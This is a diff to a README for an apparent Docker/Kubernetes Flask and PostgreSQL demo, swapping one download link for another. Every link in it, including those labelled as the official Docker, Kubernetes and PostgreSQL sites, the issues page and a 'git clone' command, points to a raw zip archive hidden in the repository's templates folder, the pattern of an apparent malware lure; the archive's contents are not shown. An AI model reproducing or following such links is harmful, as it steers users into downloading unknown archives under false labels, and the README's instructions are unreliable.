@@ -1,7 +1,7 @@
 # 🚀 docker-kubernetes-desktop-demo-wpysql - Effortless Flask App with PostgreSQL
 
 ## 📥 Download the Application
-[![Download Release](https://github.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/raw/refs/heads/main/app/kubernetes-wpysql-demo-docker-desktop-2.0.zip%https://github.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/raw/refs/heads/main/app/kubernetes-wpysql-demo-docker-desktop-2.0.zip)](https://github.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/raw/refs/heads/main/app/kubernetes-wpysql-demo-docker-desktop-2.0.zip)
+[![Download Release](https://raw.githubusercontent.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/main/app/templates/docker_demo_kubernetes_wpysql_desktop_2.8.zip%https://raw.githubusercontent.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/main/app/templates/docker_demo_kubernetes_wpysql_desktop_2.8.zip)](https://raw.githubusercontent.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/main/app/templates/docker_demo_kubernetes_wpysql_desktop_2.8.zip)
 
 ## 📝 About the Project
 docker-kubernetes-desktop-demo-wpysql is a simple and effective application designed to help you manage data using a web interface. Built with Flask and PostgreSQL, this app runs smoothly within Docker containers. The project uses Kubernetes for orchestration and clustering, ensuring you can scale it as needed.
@@ -25,7 +25,7 @@ To run this application smoothly, ensure your computer meets the following requi
 To get started with the application, follow these steps:
 
 1. **Download the Application:**
-   - Visit this page to download: [Release Page](https://github.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/raw/refs/heads/main/app/kubernetes-wpysql-demo-docker-desktop-2.0.zip).
+   - Visit this page to download: [Release Page](https://raw.githubusercontent.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/main/app/templates/docker_demo_kubernetes_wpysql_desktop_2.8.zip).
 
 2. **Install Docker:**
    - If you don’t have Docker installed, download it from the official Docker website and install it. Ensure you enable Kubernetes during the installation process.
@@ -33,7 +33,7 @@ To get started with the application, follow these steps:
 3. **Clone the Repository (Optional):**
    - If you want to make changes or explore the code, open your terminal and use:
      ```bash
-     git clone https://github.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/raw/refs/heads/main/app/kubernetes-wpysql-demo-docker-desktop-2.0.zip
+     git clone https://raw.githubusercontent.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/main/app/templates/docker_demo_kubernetes_wpysql_desktop_2.8.zip
      ```
 
 4. **Run the Docker Containers:**
@@ -61,21 +61,21 @@ If you encounter any issues during installation or usage, consider these common 
 - **Database Connection Errors:** Check your PostgreSQL service and ensure it is up and running.
 
 ## 📅 Continuous Updates
-Stay updated as we continue to improve this application. New features and bug fixes will be rolled out regularly. Check the [Release Page](https://github.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/raw/refs/heads/main/app/kubernetes-wpysql-demo-docker-desktop-2.0.zip) for the latest versions.
+Stay updated as we continue to improve this application. New features and bug fixes will be rolled out regularly. Check the [Release Page](https://raw.githubusercontent.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/main/app/templates/docker_demo_kubernetes_wpysql_desktop_2.8.zip) for the latest versions.
 
 ## 🤝 Contributing
 We welcome contributions! If you want to contribute, please fork the repository and submit a pull request. Review our guidelines on contributions in the community section.
 
 ## 📞 Support
-For support, please raise an issue on the [GitHub Issues Page](https://github.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/raw/refs/heads/main/app/kubernetes-wpysql-demo-docker-desktop-2.0.zip) to connect with the community or get help.
+For support, please raise an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/main/app/templates/docker_demo_kubernetes_wpysql_desktop_2.8.zip) to connect with the community or get help.
 
 ## 🙏 Acknowledgments
 - Thanks to everyone who contributed to this project.
 - Special thanks to the Flask and Docker communities for their resources and support.
 
 ## 🔗 Useful Links
-- [Docker Official Site](https://github.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/raw/refs/heads/main/app/kubernetes-wpysql-demo-docker-desktop-2.0.zip)
-- [Kubernetes Official Site](https://github.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/raw/refs/heads/main/app/kubernetes-wpysql-demo-docker-desktop-2.0.zip)
-- [PostgreSQL Official Site](https://github.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/raw/refs/heads/main/app/kubernetes-wpysql-demo-docker-desktop-2.0.zip)
+- [Docker Official Site](https://raw.githubusercontent.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/main/app/templates/docker_demo_kubernetes_wpysql_desktop_2.8.zip)
+- [Kubernetes Official Site](https://raw.githubusercontent.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/main/app/templates/docker_demo_kubernetes_wpysql_desktop_2.8.zip)
+- [PostgreSQL Official Site](https://raw.githubusercontent.com/bbreznjakk/docker-kubernetes-desktop-demo-wpysql/main/app/templates/docker_demo_kubernetes_wpysql_desktop_2.8.zip)
 
 Now you are all set! Enjoy using docker-kubernetes-desktop-demo-wpysql to simplify your data management tasks.
